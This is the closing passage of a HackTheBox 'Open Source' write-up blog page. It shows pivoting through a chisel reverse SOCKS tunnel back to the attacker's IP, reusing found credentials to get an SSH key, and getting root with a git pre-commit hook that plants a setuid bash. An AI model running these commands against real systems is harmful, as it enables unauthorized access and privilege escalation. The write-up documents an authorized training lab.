+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dev01@10.129.168.8: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.</span></span></code></pre></div></div>
+<p>maybe we keep the password for latter usage and move on</p>
+<p>From the docker we have we want to get the ip of the host in the docker network , we can check the arp :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522222022.png"
+        data-srcset="/assets/images/open-source/20220522222022.png, /assets/images/open-source/20220522222022.png 1.5x, /assets/images/open-source/20220522222022.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522222022.png"
+        title="error" /></p>
+<p>knowing that we can set a chisel as socks proxy server to scan the host in the docker network</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># @ my side</span>
+</span></span><span class="line"><span class="cl">./chisel_1.7.7_linux_amd64  server -p <span class="m">8000</span> --reverse
+</span></span><span class="line"><span class="cl"><span class="c1"># @ target</span>
+</span></span><span class="line"><span class="cl">./chisel_1.7.7_linux_amd64 client 10.10.16.31:8000 R:1080:socks</span></span></code></pre></div></div>
+<p>and edit the <code>/etc/proxychains.conf</code> to have <code>socks5  127.0.0.1 1080</code> and in foxy proxy set the proxy to sock5 and port 1080</p>
+<p>scanning the host we can see port <code>3000</code> is open , we can visit it at our browser</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522222635.png"
+        data-srcset="/assets/images/open-source/20220522222635.png, /assets/images/open-source/20220522222635.png 1.5x, /assets/images/open-source/20220522222635.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522222635.png"
+        title="error" /></p>
+<p>we can use the credentials we have found earlier to login and it works</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522222821.png"
+        data-srcset="/assets/images/open-source/20220522222821.png, /assets/images/open-source/20220522222821.png 1.5x, /assets/images/open-source/20220522222821.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522222821.png"
+        title="error" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522224019.png"
+        data-srcset="/assets/images/open-source/20220522224019.png, /assets/images/open-source/20220522224019.png 1.5x, /assets/images/open-source/20220522224019.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522224019.png"
+        title="error" /></p>
+<p>with this ssh key we can login with user <code>dev01</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522230112.png"
+        data-srcset="/assets/images/open-source/20220522230112.png, /assets/images/open-source/20220522230112.png 1.5x, /assets/images/open-source/20220522230112.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522230112.png"
+        title="error" /></p>
+<h1 id="root-access">Root access</h1>
+<p>After running <code>pspy</code> on the target will find the following :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522230941.png"
+        data-srcset="/assets/images/open-source/20220522230941.png, /assets/images/open-source/20220522230941.png 1.5x, /assets/images/open-source/20220522230941.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522230941.png"
+        title="error" /></p>
+<p>it seems with the root uid , it creates backup for the home of user dev01 , we can visit the path</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522231056.png"
+        data-srcset="/assets/images/open-source/20220522231056.png, /assets/images/open-source/20220522231056.png 1.5x, /assets/images/open-source/20220522231056.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522231056.png"
+        title="error" /></p>
+<p>searching on how can we execute script with this information will find <a href="https://support.gitkraken.com/working-with-repositories/githooksexample/#:~:text=Open%20a%20terminal%20window%20by,the%20pre%2Dcommit%20file%20executable." target="_blank" rel="noopener noreffer ">this</a> talks about hooks.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dev01@opensource:~/.git/hooks$ <span class="nb">echo</span> <span class="s2">&#34;cp /bin/bash /tmp/bash ; chmod +s /tmp/bash&#34;</span> &gt;&gt; pre-commit.sample
+</span></span><span class="line"><span class="cl">dev01@opensource:~/.git/hooks$ mv pre-commit.sample pre-commit</span></span></code></pre></div></div>
+<p>now wait until the bash is here</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /tmp <span class="p">;</span> watch ls</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522231511.png"
+        data-srcset="/assets/images/open-source/20220522231511.png, /assets/images/open-source/20220522231511.png 1.5x, /assets/images/open-source/20220522231511.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522231511.png"
+        title="error" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522231541.png"
+        data-srcset="/assets/images/open-source/20220522231541.png, /assets/images/open-source/20220522231541.png 1.5x, /assets/images/open-source/20220522231541.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522231541.png"
+        title="error" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-10-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-10-08-open-source/" data-title="Open Source HackTheBox Writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,git,docker,port-forwarding"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-10-08-open-source/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-10-08-open-source/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-10-08-open-source%2f&amp;text=Open%20Source%20HackTheBox%20Writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/git/">Git</a>,&nbsp;<a href="/tags/docker/">Docker</a>,&nbsp;<a href="/tags/port-forwarding/">Port-Forwarding</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/web-exploitation/2022-10-01-meme-generator/" class="prev" rel="prev" title="meme generator challenge writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>meme generator challenge writeup</a>
+            <a href="/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/" class="next" rel="next" title="JustCTF Extra Safe Security Layers writeup">JustCTF Extra Safe Security Layers writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
